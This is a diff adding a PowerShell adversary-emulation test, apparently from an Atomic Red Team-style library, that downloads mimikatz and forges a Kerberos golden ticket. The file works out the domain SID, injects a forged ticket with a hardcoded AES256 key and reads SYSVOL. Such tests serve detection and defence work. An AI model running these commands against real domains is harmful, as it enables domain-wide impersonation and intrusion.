@@ -1,0 +1,69 @@
+#TechniqueName: Steal or Forge Kerberos Tickets: Golden Ticket
+#AtomicTestName: Crafting golden tickets with mimikatz
+#Language: ps1
+
+#get_prereq_commands
+$mimikatz_path = cmd /c echo $env:TEMP\mimikatz\x64\mimikatz.exe
+Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+
+
+#prereq_commands
+$mimikatz_path = cmd /c echo $env:TEMP\mimikatz\x64\mimikatz.exe
+if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+
+
+#commands
+Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
+Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
+
+# get current domain SID if default was used
+$domain_sid = "S-1-5-21-DEFAULT"
+If ($domain_sid -Match "DEFAULT") {
+  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
+  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
+  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
+  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
+}
+
+# create batch file with commands to run in a separate "runas /netonly" session
+# so we don't purge Kerberos ticket from the current Windows session
+# its output goes to golden.txt temp file, because we cannot capture "runas /netonly" output otherwise
+@"
+>%TEMP%\golden.txt 2>&1 (
+  echo Purge existing tickets and create golden ticket:
+  klist purge
+  $env:TEMP\mimikatz\x64\mimikatz.exe "kerberos::golden /domain:example.com /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt" "exit"
+
+  echo.
+  echo Requesting SYSVOL:
+  dir \\example.com\SYSVOL
+  
+  echo.
+  echo Tickets after requesting SYSVOL:
+  klist
+
+  echo.
+  echo End of Golden Ticket attack
+)
+"@ -Replace "DOMAIN_SID", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat
+
+# run batch file in a new empty session (password and username do not matter)
+echo "foo" | runas /netonly /user:fake "$env:TEMP\golden.bat" | Out-Null
+
+# wait until the output file has logged the entire attack
+do {
+  Start-Sleep 1 # wait a bit so the output file has time to be created
+  Get-Content -Path "$env:TEMP\golden.txt" -Wait | ForEach-Object {
+    if ($_ -match 'End of Golden Ticket attack') { break } 
+  }
+} while ($false) # dummy loop so that 'break' can be used
+
+# show output from new empty session
+Get-Content $env:TEMP\golden.txt
+
+# cleanup temp files
+Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
+Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
